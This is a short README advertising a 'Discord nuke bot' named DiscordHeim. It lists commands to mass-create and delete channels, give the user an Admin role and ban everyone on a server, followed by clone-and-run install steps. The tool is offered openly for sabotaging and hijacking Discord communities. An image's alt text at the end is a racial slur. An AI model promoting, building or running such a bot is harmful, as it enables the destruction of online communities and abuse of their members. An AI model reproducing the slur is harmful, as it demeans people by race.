# New Discord Nuke Bot

Hello! Allow me to present the Discord Nuke bot, [DiscordHeim]. Currently in beta, our goal is to create the best Discord nuke bot in the full version. That's all for now. Let's discuss how to use it:

1. Initially, it prompts for your token in the console:
```python
token = input("Enter your bot's token: ")
bot.run(token)
```
After entering the token, it starts working.

2. If you've renamed the channel created by your bot, adjust the code here:
```python
if 'nuke' in channel.name:
```
Take your time to understand this part.

**Commands:**
- `!createchannel` -> Creates a channel.
- `!stopcreatechannel` -> Halts channel creation.
- `!deletechannel` -> Deletes created channels.
- `!makeadmin` -> If an Admin role exists, it will make you an Admin; otherwise, it creates and adds you.
- `!baneveryone` -> Bans everyone.

**Note:** You can customize the prefix as you prefer!



**My Discord Name: lordexhub**

# Download

```
pip install discord asyncio
git clone https://github.com/aruping/DiscordHeimers
cd DiscordHeimers
python3 main.py
```

![NIGGER 😀](https://r.resimlink.com/Uf8qCW2ve.gif)
